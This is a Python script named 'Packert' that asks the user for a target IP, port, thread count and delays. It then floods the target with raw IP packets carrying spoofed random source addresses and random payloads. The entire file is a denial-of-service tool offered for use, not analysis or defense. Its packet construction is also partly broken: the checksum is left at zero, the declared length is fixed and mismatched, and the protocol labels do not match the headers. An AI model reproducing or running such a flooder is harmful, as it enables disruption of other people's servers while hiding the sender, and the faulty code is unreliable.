import random
import socket
import struct
import threading
import time

# Define a function to send packets to the server
def send_packets(target_ip, target_port, num_threads, num_packets_per_thread, min_delay, max_delay):
    # Define the packet format and maximum packet size
    format = "!HH"
    max_packet_size = 65535

    # Create a new socket and connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.connect((target_ip, target_port))
    
    # Generate and send packets
    for i in range(num_packets_per_thread):
        # Generate random packet parameters
        payload = bytes([random.randint(0, 255) for _ in range(random.randint(1, max_packet_size - 4))])
        protocol = random.choice([socket.IPPROTO_TCP, socket.IPPROTO_UDP, socket.IPPROTO_ICMP])
        source_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        source_port = random.randint(1024, 65535)
        dest_ip = target_ip
        dest_port = target_port
        
        # Create the packet header
        header = struct.pack(format, source_port, dest_port)
        
        # Construct the IP packet
        ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, max_packet_size, 1, 1, 0, protocol, 0, socket.inet_aton(source_ip), socket.inet_aton(dest_ip))
        packet = ip_header + header + payload
        
        # Send the packet
        s.send(packet)
        
        # Sleep for a random amount of time
        time.sleep(random.uniform(min_delay, max_delay))
    
    # Close the socket
    s.close()

# Define the menu function
def menu():
    print("Welcome to Packert!")
    print("Please enter the following information to start the packet generation process.")
    print("")

    # Get the target server's IP address and port number
    target_ip = input("Enter the target server's IP address: ")
    target_port = int(input("Enter the target server's port number: "))

    # Get the packet generation parameters
    num_threads = int(input("Enter the number of threads to use: "))
    num_packets_per_thread = int(input("Enter the number of packets per thread: "))
    min_delay = float(input("Enter the minimum delay between packets (in seconds): "))
    max_delay = float(input("Enter the maximum delay between packets (in seconds): "))

    # Start the packet generation process
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=send_packets, args=(target_ip, target_port, num_threads, num_packets_per_thread, min_delay, max_delay))
        threads.append(t)
        t.start()

    # Wait for all the threads to finish
    for t in threads:
        t.join()

# Call the menu function
menu()
